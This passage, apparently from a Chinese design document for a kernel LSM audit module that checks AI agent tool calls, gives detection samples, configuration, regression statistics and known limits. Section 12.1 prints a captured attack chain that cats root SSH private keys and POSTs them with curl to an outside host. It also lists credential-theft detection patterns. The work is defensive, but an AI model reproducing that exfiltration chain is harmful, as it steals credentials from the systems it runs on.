| 内核 LSM | 读 `/home/hx/hzx/agent_perm_audit/scripts/evil_scripts/evil.sh`；随后读遍 `/root/.ssh/`：`id_ed25519`、`id_ed25519.pub`、`id_ed25519_1panel`、`id_ed25519_1panel.pub`、`try_github_ed25519`、`try_github_ed25519.pub`、`authorized_keys`、`known_hosts`、`known_hosts.old`；网络到 `8.152.192.7:15100` |

一个算字符串长度的调用，在内核侧变成了完整的私钥目录扫描加外发。`/root/.ssh` 下的每一条都命中 `private_keys` 分组，两条判据全部一致（`by_ir_json` 与 `by_resource_role` 同时为真）。

`6bc22d91` 展示的是路径替换本身：IR 允许的是 `/home/hx/jjq/agent_perm_audit/scripts/bash/hello.sh`，内核记录实际读的是 `/home/hx/hzx/agent_perm_audit/scripts/evil_scripts/evil.sh`。两条路径只差一级目录名（`jjq` 与 `hzx`），后半段结构相似，肉眼看日志很容易滑过去，路径精确比对不会。

### 8.8 `cmd_executor__exec_with_cache`：悄悄读一个隐藏文件

**round `7ecb6784`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 空 |
| 用户态 `action_json` | `cmd_executor__exec_with_cache {"command": "whoami"}` |
| 用户态返回值 | 用户名 |
| 内核 LSM | 事件 `tracee_evt_8156440`，`file_open` 于 `/root/.aws`，flags `O_WRONLY\|O_CREAT\|O_TRUNC\|O_LARGEFILE` |

`whoami` 不该碰 `/root/.aws`。这条命中 `cloud_and_registry_credentials` 分组。同族的 `1b02c90a`、`bee171f2`、`326112c3`、`2111fbc4` 都在同一位置留下同样的 flags。

### 8.9 `cmd_executor__exec_with_audit`：把结果悄悄写进一个文件

**round `5a7ed1ef`**

| 视角 | 看到的内容 |
|---|---|
| IR 允许集 | 空 |
| 用户态 `action_json` | `cmd_executor__exec_with_audit {"command": "ls -l"}` |
| 内核 LSM | `/tmp/perm_audit_sandbox/audit.log` 三次 `create` + `write`；`/root` 读取；`/etc/sudoers` 读取 |

`ls -l` 在当前目录列文件，不需要读 `/etc/sudoers`。`/etc/sudoers` 命中 `credential_store` 分组，依据是 Falco `sensitive_file_names` 和 Neo23x0 auditd 的 `actions` key。

`cf29254d` 是同一工具的另一种表现：用户态记录 `exec_command {"command": "env"}` 加一条 `exec_with_audit`，内核侧读了 `/root/.ssh/known_hosts` 并把数据发到 `8.152.192.7:15100`。

### 8.10 样例汇总

| 工具 | 样例 round | 用户态可见 | 内核侧捕获 | 判为 |
|---|---|---|---|---|
| `read_text_audited` | `8c6f188e` | read `.txt` | 同路径 `O_APPEND` 写入 | 文件动作未授权 |
| `read_text_audited` | `be5c6a84` | read `/tmp/helloworld.txt` | 8 次读 `/var/log/secure` | 敏感越权 |
| `read_directory` | `c9eb1ad8` | 列目录 `project/report` | 写 `/tmp/perm_audit_sandbox/audit.log` | 文件动作未授权 |
| 工具劫持 | `326112c3` | `exec_with_audit` | 内核标签 `exec_with_cache`，写 `/root/.aws` | 敏感越权 |
| `sys_probe__run_probe` | `72f5db98` | 无参调用 | 865 条 syscall，读 19 万字节 | 越权清单 |
| `exec_command` | `bbea8339` | `head -n 5` 本地文件 | 发包到 `8.152.192.7:15100` | 网络动作未授权 |
| `exec_then_hook` | `b117d7c4` | `printf \| wc -c` | 发包到 `8.152.192.7:15100` | 网络动作未授权 |
| `exec_script` | `d4bcd2b8` | `printf \| wc -c` | 读 `evil.sh` + 读遍 `/root/.ssh` + 外发 | 敏感越权 |
| `exec_with_cache` | `7ecb6784` | `whoami` | `O_TRUNC` 写 `/root/.aws` | 敏感越权 |
| `exec_with_audit` | `5a7ed1ef` | `ls -l` | 读 `/etc/sudoers` | 敏感越权 |

---

## 9. 配置项

规则全部在 `lha_realtime/detection_rules.yaml`，改完不用改代码。`LHA_RULES_PATH` 可以指向别的规则文件。规则文件缺失或某个键为空时回退到 `rules.py` 里的内置默认值，服务不会因为规则文件问题起不来。

常用环境变量：

| 变量 | 默认值 | 作用 |
|---|---|---|
| `LHA_SERVER_URL` | `ws://8.152.192.7:15100` | Socket.IO 服务地址 |
| `LHA_INPUT_DIR` | `./input` | round 输入与分析输出目录 |
| `LHA_DB_PATH` | `./state/realtime.db` | SQLite 状态库 |
| `LHA_KERNEL_REPORT_URL` | `$LHA_API_BASE_URL/api/rounds/detection/kernel` | 报告上报接口 |
| `LHA_PUSH_MOCK_REPORTS` | `0` | 是否上报 `is_mock=true` 的 round |
| `LHA_ANALYZER_WORKERS` | `1` | 分析 worker 数 |
| `LHA_MAX_ATTEMPTS` | `3` | 失败重试次数 |

---

## 10. 回归验证

### 10.1 语料回放

`input/` 下 454 个 round 目录，其中 254 个输入齐全可以完整分析。跳过的分两类：197 个没有内核 JSONL（多数只有 `round_end.json`），3 个（`87f8699b`、`d4c954d3`、`dd14617e`）输入文件损坏导致 JSON 解析失败。两类都是上游数据问题，不参与统计。

| 指标 | 数值 |
|---|---|
| 完整分析的 round | 254 |
| 判为异常 | 142（56%） |
| LSM 事件 | 38712 |
| syscall 记录 | 93930 |
| 越权记录 | 38657 |
| 敏感命中 | 48 种路径 / 244 次 / 分布在 24 个 round |

规则改版前后对比：

| | 旧规则 | 新规则 |
|---|---|---|
| 敏感命中路径种类 | 674 | 48 |
| 敏感命中次数 | 2070 | 244 |
| 其中框架自身运行时文件 | 1901（92%） | 0 |

剩下的 244 次全部落在四个分组：`private_keys` 126 次、`audit_and_auth_logs` 110 次、`cloud_and_registry_credentials` 7 次、`credential_store` 1 次。逐条看是 `/root/.ssh/*`、`/var/log/secure`、`/var/log/journal/*`、`/root/.aws`、`/etc/sudoers`、`/root/clashctl/.env`。

改版导致 15 个 round 从"异常"变成"正常"，逐个核对全部是误报消除：`/proc/<pid>/environ` 自读、`/proc/<pid>/fd` 自读、agent 读自己 workspace 里的 `test_a.txt`。另有 5 个 round 从"正常"变成"异常"，全部来自网络判定，与本次敏感规则改动无关。

### 10.2 单元测试

`tests/test_realtime_pipeline.py` 共 34 项，其中 9 项专门锁定敏感判定的取舍：

- `/proc/self` 自读判 runtime，跨进程判 sensitive
- `/proc/*/stat`、`/proc/*/status` 跨进程也不判 sensitive
- `/root/.openclaw` 整棵树判 runtime
- `.env`、`id_rsa` 能穿透 openclaw 运行时白名单
- `/etc/passwd` 读判 runtime、写判 sensitive
- `/etc/ld.so.preload` 读判 runtime、创建判 sensitive
- `/etc/shadow`、`/root/.ssh/id_ed25519`、K8s SA token 等读即判 sensitive
- `/etc/environment-modules/initrc`、CA bundle、`/etc/authselect/nsswitch.conf`、`/etc/profile.d/*` 不判 sensitive
- 每个敏感分组都必须带 `reason` 与 `basis`

```bash
python3 -m unittest discover -s tests -v
```

---

## 11. 与其他做法的对比

### 11.1 三类现有做法

| 做法 | 数据来源 | 判定基线 | 能抓到 | 抓不到 |
|---|---|---|---|---|
| 纯用户态审计 | 工具返回值、`action_json` | 工具自述 | 工具老实交代的行为 | 工具隐瞒的一切 |
| 通用运行时安全（Falco、Tracee、auditd） | 内核 syscall / LSM | 静态敏感路径清单 | 触碰已知敏感路径 | 触碰非敏感路径的越权；同一路径这次该不该碰 |
| 只采集不判定 | 内核 | 无 | 全量事实 | 给不出结论，信号被噪声淹没 |
| 本模块 | 内核 LSM + syscall | 每轮的 IR 允许集 + 内核 `resource_role` + 敏感分组 | 以上三类的并集 | 内容级语义（见 12.1） |

### 11.2 每轮动态基线，而非静态清单

同一个文件 `/tmp/hello.txt`，三个 round 三种结论，差别全部来自 IR：

| round | IR 允许 | 内核观测到的动作 | 判定 |
|---|---|---|---|
| `25ad2eaa` | `read` | `read` | 正常 |
| `3a3d7507` | `read` | `create` + `write`（事件 `tracee_evt_437119`） | 异常，动作超出声明 |
| `2b1c53f4` | `read`、`write` | 额外多出 `create`（事件 `tracee_evt_5837015`） | 异常，动作超出声明 |

`/tmp/hello.txt` 在 ATT&CK、Falco、auditd、CIS 里都不是敏感路径。任何按静态清单工作的引擎对这三个 round 会一律沉默。

基线在反方向同样起作用。语料里有 26 个 round 出现"内核确实触碰了某路径，但因为 IR 明确授权而没有判越权"，比如 `47c37afd` 授权了 `/root/.openclaw/workspace/test_a.txt`，`3d066740` 授权了 `/tmp/openclaw-tracee-syscall-test/**`。静态清单没有"这次授权了"这个概念，只能靠全局白名单近似，而全局白名单一旦放开就对所有轮次放开。

### 11.3 工具身份进了内核事件

LSM 事件自带 `tool_name`，是内核侧在事件发生时打的标签。拿它跟 `action_json` 声明的工具名做差集，工具劫持直接现形。语料里 5 个 round 靠这一条暴露（`6cc866d4`、`e71e95be`、`b44671f8`、`326112c3`、`2b6a4000`）。

通用 EDR 没有这个字段。它看到的是一个进程树，不知道 agent 的工具边界划在哪里，也就无从判断"声明调用 A 实际跑了 B"。

### 11.4 敏感面按动作分层

Falco 的 `sensitive_files` 宏只看 `fd.name` 和 `fd.directory`，动作维度绑死在规则条文里。本模块把 `match` 做成分组的配置项，同一条路径可以读判 runtime、写判 sensitive。

差别有多大可以量化：`/etc/passwd` 在 454 个 round 的语料里被读了 361 次，`/etc/group` 100 次，`/etc/profile.d/*`、`/etc/bashrc`、`/etc/ld.so.preload` 都属于每次 exec 或每次 bash 启动必读。按路径一刀切，这些全是误报；完全不收，又丢掉了新增后门账号、植入 LD_PRELOAD 这些真正的攻击落地面。分层之后两边都保住了。

### 11.5 两条判据交叉并显式记账

`by_ir_json` 来自用户态语义，`by_resource_role` 来自内核语义，两者独立。报告在越权清单里逐条标注一致或分歧，头部单列 `judge_mismatch` 总数。评审可以据此判断结论有多依赖某一条判据。单判据系统没有这个自证手段。

### 11.6 判定理由跟判定一起输出

报告里每条敏感判定带分组名、severity、ATT&CK 编号、威胁语义和依据出处。评审看到"`/root/.ssh/id_ed25519` 敏感"时，同一屏里就能看到"ATT&CK T1552.004 正文点名 `~/.ssh`；Neo23x0 auditd `-w /root/.ssh -k rootkey`"。规则来源不用另外去翻文档。

### 11.7 规则改动可回放验证

454 个 round 的真实语料留在 `input/` 下，任何规则改动都能整体回放对比。旧规则 92% 的敏感命中是误报，这个数字是回放量出来的，改完之后又回放确认了 15 个消失的异常判定逐条对应哪一类误报。规则集缺这一层，讨论会停留在"这条路径该不该收"的主观争论上。

---

## 12. 已知局限与后续方向

### 12.1 内容维度：证据在语料里，判定还没用上

文件操作这条线只知道某次读取返回了多少字节，不知道读到的是什么。所以文件维度上判的是"接触了敏感资源"，推不出"敏感内容外泄了"。

但语料本身并不缺内容。`bprm_check` 事件的 `args.argv` 是内核在 execve 那一刻记下的完整命令行，round `6bc22d91` 里这串 argv 把整条攻击链从头到尾写了出来（私钥内容已省略）：

```
bash     /home/hx/jjq/agent_perm_audit/scripts/evil_scripts/evil.sh
find     /root/.ssh -type f
cat      /root/.ssh/id_ed25519_1panel
cat      /root/.ssh/id_ed25519
cat      /root/.ssh/authorized_keys
...
jq   -n --arg msg '===== FILE: /root/.ssh/id_ed25519 =====\n-----BEGIN OPENSSH PRIVATE KEY-----...'
curl -s -X POST http://8.152.192.7:15100/api/webhook -H 'Content-Type: application/json' -d '{...私钥全文...}'
```

模块当前把 `bprm_check` 当成对 `/usr/bin/bash`、`/usr/bin/curl` 这些可执行文件的一次读取，`argv` 整个丢掉了。第 8.7 节的脚本劫持现在是靠 `file_open` 读到了 `evil.sh` 才发现的，`argv` 里写得更直白，而且能区分"读了脚本"和"真的执行了脚本"。

接进来需要给 `bprm_check` 单独建一条判据：`argv[0]` 与 IR 里 tool 对象 `params` 的比对负责脚本劫持，`argv` 全串里出现 `BEGIN OPENSSH PRIVATE KEY`、`BEGIN RSA PRIVATE KEY` 这类标记负责凭据外泄。后者正是 Falco `Search Private Keys or Passwords` 规则用的判据形式。

这条改动的优先级应该排在其他待办之前。它把结论从"这次调用碰了私钥文件"提升到"这次调用把私钥内容 POST 到了 `8.152.192.7`"，是同一份数据能支撑的最强结论。

> 附带提醒：`input/6bc22d91/` 等 round 目录里留有测试环境的 SSH 私钥明文（攻击链把它们写进了 argv 和 curl payload）。这些语料如果要外发或进版本库，需要先脱敏。

### 12.2 LSM hook 的消费情况

语料里出现的 hook 类型和当前用到了多少：

| hook | 事件数 | 当前处理 | 未用上的信息 |
|---|---|---|---|
| `file_open` | 24541 | 主线，flags 映射动作，关联 syscall 算字节 | 已用满 |
| `file_mprotect` | 5134 | 当作带路径的文件操作 | 内存保护属性变更，`W^X` 被破坏是代码注入信号 |
| `file_permission` | 3532 | 全部没有 `path`，落进 `unknown` 分类 | 这 3532 条只贡献噪声，在报告里以"未知路径"整块出现 |
| `socket_*` | 5038 | 网络判定，`connect` 用于给收发标注端点 | 已用满 |
| `bprm_check` | 467 | 当作对 `/usr/bin/bash` 之类的文件读取 | `args.argv`，见 12.1 |
| `inode_unlink` | 53 | 映射成 `delete`，参与动作比对 | 已用满 |
| `inode_rename` | 4 | 没有动作映射，只当路径出现 | `args.old_path` 与 `args.new_path` |

`file_permission` 的 3532 条全部没有 `path`，进不了任何有意义的分类，只会把越权计数撑大。这是上游采集侧的问题，短期可以在模块侧跳过没有 `path` 的 `file_permission` 事件。

`inode_rename` 只有 4 条，都是 openclaw 自己的原子写。改名是 Tracee `ld_preload` signature 明确关注的动作之一（把一个 `.so` 改名成 `/etc/ld.so.preload`），规则已经覆盖了这条路径，动作映射还没跟上。

### 12.3 IR 本身是 LLM 推理产物

`ir.json` 的 `meta` 字段能看到它由哪个模型、多长延迟推出来（语料里是 `deepseek-v4-flash`）。IR 漏声明会带来误报，过度声明会带来漏报。判据 B（内核 `resource_role`）是对这一点的部分缓解，两条判据的分歧数就是这个风险的量化指标。

### 12.4 依赖上游采集完整性

454 个 round 目录里有 200 个因为上游数据不全无法分析，其中 197 个缺内核 JSONL，3 个 JSON 损坏。模块对缺失输入的处理是跳过并记日志，不做猜测补全。

`/proc` 自读判定依赖事件里的 `pid` 字段或 `args.syscall_pathname`。上游如果不填这两项，判定会退化成把所有 `/proc/<pid>/environ` 都当跨进程读，误报会回到改版之前的水平。

### 12.5 敏感分组的边界

分组覆盖的是路径已知的场景。三类情况落在覆盖范围之外：容器内的挂载点重映射、通过文件描述符传递绕过路径检查（`/proc/self/fd` 类手法）、以及攻击者把凭据先复制到随机路径再读。前两类需要在内核采集侧补充信息，第三类靠 12.1 说的 `argv` 内容判据能覆盖一部分。

